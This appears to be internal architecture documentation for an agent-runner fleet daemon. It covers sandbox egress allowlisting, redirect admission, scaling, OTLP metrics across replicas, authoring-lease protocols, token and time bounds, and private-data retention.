**The probe.** At boot the runner builds one scope and tears it down, and reads `net.ipv4.ip_forward`. Only success reports `egress_enforcement: true`. Otherwise the daemon reads an `allow_list_egress` runner degraded with `REASON_EGRESS_ENFORCEMENT_UNAVAILABLE` and leases it nothing (`rustd/crates/afd_runner/src/reconcile.rs`). The host needs nf_tables in its kernel, `net.ipv4.ip_forward=1`, which the runner playbook sets, and no host firewall whose forward policy drops: a drop in any table's forward chain is final.

> **The allowlist vs the deferred name layer.** The above is a resolve-at-bind address pin: own namespace, host-side nf_tables allowlist, no proxy and no resolver in the data path. When the fleet opens to untrusted or customer-operated runners with **rotating-CDN host sets** that a pin at bind cannot track, the name layer is added the **modern** way: an **eBPF/FQDN-aware datapath** that learns allowed addresses by snooping DNS *answers* and programming the same kernel set live — the Cilium `toFQDNs` pattern, or a minimal DNS-answer watcher updating our existing set. **No forward proxy, no SNI/`CONNECT` interception, no TLS man-in-the-middle**: that squid-era approach is explicitly *not* the direction. It evolves the datapath: pin at bind → pin from observed DNS, same set. Introducing a controlled resolver to snoop is itself the change from the resolver-less posture, gated to that tier. Standing residual at every tier: an allow-listed write-capable host (for example `github.com`) is still an exfiltration channel by design, closed only by short-lived, scoped tokens, a credential-model change, not this layer.
>
> **Second residual: shared front ends.** The kernel set matches destination addresses alone, and the default registry hosts sit on front ends shared with other sites. A sandbox can reach any of those sites by naming it in Server Name Indication (SNI). A hard boundary needs `registry_allowlist` pointed at a mirror on addresses the operator owns.

### HTTP destination settings

The reviewed Definition and lease carry `network.http_egress`, `package_manager_domains` and `allow`. Restricted mode, the default, permits the additional exact domains plus the standard package registries when their preset is enabled.

Public mode permits public HTTPS destinations through HTTP tools. Both modes retain private/reserved address refusal, credential binding, repository/path restrictions and read-only rules.

Every connection checks all returned addresses, including mixed public/private answers. Redirects repeat admission before connecting.

`http_egress` and `package_manager_domains` do not enlarge sandbox network access or change the runner's assigned policy.
Existing `allow` entries can extend sandbox destinations when `read_only` is `false`, within that policy.
Dedicated UI controls remain future work.

### Guarded tool downloads

`http_request` follows 301, 302, 303, 307 and 308 only for a bodyless GET.

The shared HTTP builder still disables automatic redirects. The tool composes continuations through the same lease's admission before each send (`afr_tools/src/egress/mod.rs`, `afr_egress/src/redirect/mod.rs`).

HTTPS, reviewed destination scope, address and origin request rules remain authoritative at every hop.

The guarded resolver checks every returned address at connection time.

A call follows at most three redirects within one 30-second deadline, including admission and credential minting. Each connect retains a 10-second ceiling within that deadline.

The pooled tool client disables implicit retries; inference retains its own policy. Intermediate response bodies are dropped unread. The final body retains the 1-MiB cap and reports truncation or lossy decoding before its text.

One bounded Location is resolved relative to the current URL. Both raw and resolved values pass an 8-KiB `garde` bound before their respective parsing or admission. Loop identity is the pinned URL library's serialized absolute URL with its fragment removed; a repeated identity stops before admission or send.

Missing, duplicate, malformed or oversized targets stop safely.

At the first origin change, including effective port, the chain permanently drops all modeled headers. Later hops cannot restore them or mint another credential. The lease guard covers admission and minting, then releases before every transport wait.

Private targets have no raw Debug or serialized projection. The model sees only a safe origin on a redirect refusal. Final response text and content type mask the finite known target spellings, including credential-like query values (`afr_egress/src/redirect/privacy/mod.rs`).

Unknown secrets and arbitrary repeated encodings are outside that detection claim. Redirect outcome records carry bounded status, counts and reasons; see [observability](./observability.md).

## Scaling

The split inverts the binding constraint. The pre-cutover runtime needed N Redis connections for N fleets and the pool ceiling was the wall. After the split, runners hold zero datastore connections; the bottleneck becomes `agentsfleetd` API replicas + Postgres writes, both of which scale horizontally. Runners scale out with no coordination — the operator enrolls a host with a pre-minted `agt_r`, and it pulls. The one piece needing care at multi-replica scale is placement (assignment / scheduler), which is the M84_002 (reassignment, shipped) / M85_001 (label placement, shipped) concern; the hot path (lease / report) is shardable. See [`scaling.md`](./scaling.md) for the re-derived connection math.

## Observability — bounded facts to `agentsfleetd`; logs, traces and metrics to a runner collector

The fleet is observed **without any inbound reach into runners.** A runner may sit behind Network Address Translation (NAT), on an untrusted host, or on a customer host. A scraper cannot reliably reach those machines.

Bounded per-runner facts therefore ride outbound on verbs the runner already calls: `report`, `heartbeat`, and lease grant/release. `agentsfleetd` accumulates those facts and **pushes** them, with everything else it measures, over OpenTelemetry Protocol (OTLP) to one configured endpoint. There is no scrape target and no pull endpoint: the daemon exports, nothing collects from it. The per-runner drill-down is a `runner_id` label.

The fleet delivery histogram records `event_to_lease`, `lease_to_first_chunk`, `event_to_first_chunk`, and `zombie_to_first_chunk` stages. A first chunk can carry reasoning or tool protocol; these are transport timings through daemon receipt, not browser paint. The chat UI records local `agentsfleet.chat.submit_to_first_visible` Performance Timeline measures after the first answer, reasoning, or tool activity paints. That browser measure is currently available for local diagnostics and is not exported to OTLP or the Grafana panel.

Logs, spans and runner families: [observability.md](./observability.md) §"Signal routing".

### The four per-runner families

The four are `agentsfleet_runner_failures_total`, `…_executions_total`, `…_last_seen_seconds` and `…_active_leases`, each labelled by `runner_id`. Alongside them, and deliberately **not** in the per-runner table, are the global unlabelled families that describe the control plane's own discovery cost. Families, labels and types: [`docs/metrics.census.tsv`](../metrics.census.tsv).

The poll counters describe global discovery cost without entity labels.
Divide candidate, Postgres and Dragonfly command counters by `lease_polls_total` to compare cost per poll.
An idle poll adds one Postgres probe and no Dragonfly commands.

The fleet census publishes unsettled admission count and oldest age.
Use the maximum across replicas, since each census reads the deployment-wide ledger.
A failed census withdraws both gauges rather than exporting an old value.

The four per-runner families live in a fixed-capacity (4096-series) table keyed on `runner_id`, held by the daemon in `afd_observability`: a lookup takes a read lock and the counters underneath it are atomics, so recording never blocks another recorder. The OTLP export reads only that in-memory snapshot — **zero Postgres on the export path**, so the export stays healthy exactly when the database is not. Cardinality is capped: the 4097th distinct `runner_id` routes to `runner_id="_other"` (counters preserved). Footprint is therefore bounded by that cap regardless of fleet size or uptime; a `agentsfleetd` restart zeroes the table (Prometheus counter-reset semantics absorb it; gauges self-heal within one heartbeat/lease cycle).

### Multi-replica (`agentsfleetd` N>1) — correctness is an *aggregation* property

Prod is sized for **3 `agentsfleetd` machines**. The release workflow sets that count with `flyctl scale` and verifies that all three machines are running before public readiness. The sections below are written for N>1 as the operating shape, not the contingency. A runner's verbs load-balance across replicas, so each replica holds only the slice of that runner's event stream it served. Each replica exports its own series, identified by the OpenTelemetry resource attribute that carries the machine identity rather than by a scrape target's `instance` label — so fleet-wide truth is reconstructed by the query, not by shared state:

| Series | Cross-replica query | Exact under N>1? |
|--------|---------------------|------------------|
| `failures_total`, `executions_total` | `sum by (runner_id, …)` | ✅ exact — counters are additive; per-replica slices are disjoint |
| `last_seen_seconds` | `min by (runner_id)` | ✅ exact — the most-recent sighting wins; a replica that never saw the runner exposes no series, so `min` ignores it |
| `active_leases` | `sum by (runner_id)` | ⚠️ approximate — the `+1` grant and `−1` release can land on different replicas, so the value is meaningful only in aggregate and a single-replica restart can transiently skew it |

`active_leases` is the one series that cannot be made exact purely in-memory: it is a distributed inc/dec with no routing affinity and no shared counter. Its exact source is the durable lease table (`runner.leases` — `lease_expires_at` + the held set), which is read by the **deferred metrics refresher** below. The cross-replica queries in the table above are the operator's responsibility to apply — this repository ships no dashboard artefacts, and any dashboard that graphs `active_leases` must label the panel best-effort under N>1.

### The deferred refresher — exact gauges without metrics-in-the-DB

The exact, restart-resilient form of the two gauges is a read-only background thread per replica. On a ~15 s timer it queries Postgres for `last_seen_at` and the live lease count (`count(*) WHERE lease_expires_at > now()`), overwrites an in-memory snapshot, and lets the OTLP export read that snapshot. This keeps the export path DB-free while giving every replica identical, exact values and closing the abandoned-lease over-count. It is **not "metrics in Postgres"**: it *reads* already-durable operational state to derive a gauge — the timeseries still lives only in the metrics backend. Deferred; it is the persistent answer for a scaled-out future.

## Authoring leases

Private setup work shares runner capacity with fleet runs. The sections below describe the implemented protocol; verification evidence belongs in the [check ledger](../reviews/workspace-setup/checks.md).

POST `/v1/runners/me/leases` requires `accepted_kinds` and returns `kind:"fleet"` or `kind:"authoring"`. Claims lock the runner row, count unexpired active leases across both kinds, and insert the selected lease within that transaction.

The server owns `worker_count`; a poll cannot override it. Reducing it below current occupancy stops new claims and refuses renewals until occupancy fits (`afd_runner/src/capacity/mod.rs`). Existing leases can therefore be interrupted.

The shared poll reads an optimistic kind choice. Under the host lock, each successful placement rechecks and advances the claim revision and last successful kind. Mixed placements alternate preference across daemon replicas; an empty kind tries the other, and a competing placement invalidates the old offer.

Both renewal kinds hold the runner guard before extending a live deadline. Fleet renewal locks runner → lease/affinity; authoring renewal locks draft → attempt → runner. [Concurrency](concurrency.md#runner-capacity-and-authoring-lock-order) owns the ordering and nonblocking claim exception.

Renewals sample database time after acquiring the host guard. Expired work requires a new capacity-checked claim; renewal cannot revive it. Runtime renewal extends the lease and affinity deadlines atomically under their original fences.

Authoring is creator-private work. Resolve its workspace owner, recheck creator membership, choose the oldest eligible queued message within that draft, and refuse another live attempt for the same draft. Selection across kinds must avoid starvation with a bounded alternating eligible-kind choice; an empty kind never blocks the other. Authoring messages remain a Postgres queue; Dragonfly publishes wake/progress hints, not another authoritative message copy.

Additive migrations 935–942 define creator-private `authoring.drafts`, `authoring.messages`, candidates and replay receipts; content-free `authoring.attempts` and dispatch/activity receipts. A setup chat's charges are its usage lines in `billing.usage_lines`, retained independently of the chat (billing §11). Immutable native setup/Library revisions join their existing domains.

The private progress channel is `draft:{draft_id}:events`.
The publisher and HTTP reader recheck current access before sending answer previews.
No private event joins workspace broadcast; durable message reads remain authoritative.

Each authoring lease has an attempt identity, fence, expiry, pinned model/inference settings/context/prices, and budget. Renewal/report/activity guard all of them. No runtime credential mint, tenant tools, memory, repository checkout, schedule access, or fleet message capability is issued to this lease. Instructions and native setup are untrusted context, never system authority.

### Scoped provider boundary

The daemon issues an opaque lease capability and serves the fourth machine route, `/model-calls`. [The resource reference](api_resources.md) owns its issuance, bindings, wire, expiry, revocation, dispatch receipts, and replay behavior. The daemon holds provider keys and dispatches each authorized call; the runner receives bounded text/proposals/usage. Existing raw-key runtime transport is not reused for authoring. Keep automatic transport retries disabled on this path, count every physical send, and stop on an unresolved dispatch. Real-router integration tests must deny foreign runner/model bindings, expired/revoked tokens, duplicate physical sends, and runtime credential minting. A local capability type alone supplies no boundary proof.

Both adapters call the shared `afd_inference::stream::StreamTurn` reader over Rig's native codecs.
The reader owns cancellation, inactivity and finalization; known partial usage survives a failed response.
Purpose adapters retain separate physical senders, permissions and retry eligibility.

The [shared chat explanation](shared_chat_verification.md#backend-ownership) maps these methods and their callers.

### Token and time bounds

| Bound | Value | Enforcement |
|---|---|---|
| Input per model call | Selected model's physical window | Shared compaction measures the assembled request, including instructions, schemas, history and current text, while reserving output and framing headroom. |
| Output across a turn | Saved model maximum output tokens | Sum provider output over all calls; reserve only remaining output for each next call. |
| Calls per attempt | 8 | Daemon and runner counters; no tool loop beyond this count. |
| Wall time per attempt | 300 seconds | Monotonic runner timer plus daemon expiry/fence; timeouts become timed_out. |
| Provider request | Up to 300 seconds | Recorded dispatch deadline, clipped to attempt expiry; replay never starts another send. Upstream cancellation remains unconfirmed. |
| Runner model-call HTTP wait | 310 seconds | Allows the bounded provider call and receipt settlement. |
| Lease TTL / renewal | 30 seconds /10 seconds | No overlapping admitted lease while the prior live attempt remains counted. |
| First instructions / edited | 12,288 /32,768 characters | Shared validated text bounds, independently of tokenizer counts. |
| Progress frame / terminal envelope | 4 KiB /128 KiB | Typed bounds before append or spool. |

Original history remains creator-private and is read in bounded pages. [Conversation compaction](context_lifecycle.md) retains working notes without a fixed 64-message or 32,768-token conversation allowance.

Before each physical send, the daemon funds the complete measured request and known prior costs. It releases database locks while funding, then rechecks source and authority before recording dispatch intent (`afd_authoring/src/model/dispatch/funding.rs`).

The shared window planner reserves output and framing headroom. The turn's remaining output allowance and selected model's physical window still bound every request (`afd_context/src/window.rs`).

The byte fallback can refuse input that a provider-specific tokenizer would fit. Provider-reported usage remains authoritative for settlement, including charged reasoning tokens.

Every physical dispatch spends the call allowance; automatic transport retries are disabled. Uncertain usage ends the attempt before another dispatch can spend an unknown output remainder. [Proposal correction](runner_execution.md#proposal-correction-and-failure) describes bounded retries after rejected edits.

The model has one proposal tool: initialize once when no candidate exists, then small edits against the candidate ID and revision. Claim includes the current candidate; every proposal acknowledgement returns its accepted version. Exact replay returns that original version, even after later edits. It may ask clarifying questions. It cannot grant access, publish, Save, call arbitrary functions, or choose different credentials. Tool operations pass the same validator as drawer edits. Assistant answer and candidate changes are separate records; terminal report does not re-emit the whole definition.

### Private copies and report recovery

| Copy | Owner | Lifetime and removal |
|---|---|---|
| Draft messages and candidates | Creator-private authoring domain | Draft deletion removes private rows and fences every attempt. |
| Dispatch result, native provider reply and answer receipts | Authoring domain | Bounded private replay copies expire after 24 hours. Native replies bind the attempt and unchanged conversation prefix, stay out of runner responses and logs, and are cleared with draft deletion. Accounting receipts retain no answer. |
| Authoring report, temporary files and rejected copies | Supervisor | Private bytes are encrypted with a separate local content key. Logical expiry is 24 hours from first write and survives retry or rename. Cleanup runs during uptime and before any restart content read or upload. |
| Attempt and settlement records | Runner and billing domains | Retain content-free identities and validated accounting independently of the draft. |
| Provider logs and infrastructure snapshots | Their service owners | Follow their published retention; draft deletion cannot promise physical removal from these systems. |

The 24-hour limit is logical expiry enforced by the supervisor. Physical files can remain while a machine is powered off. A holder of retained ciphertext and its local key can decrypt offline; storage snapshots follow their own retention.

[Private content and report retention](runner_execution.md#private-content-and-report-retention) owns encryption, clock rollback, startup cleanup and per-entry failure behavior. These rules apply to the supervisor's private spool.

Accounting-only replay uses the original report identity and normalized accounting fields. Receipts prevent duplicate settlement after lost acknowledgements or draft deletion. A report never received can also settle without restoring private content.

Altered usage conflicts; no accounting retry restores a message, answer or candidate. The [check ledger](../reviews/workspace-setup/checks.md) records verification evidence.
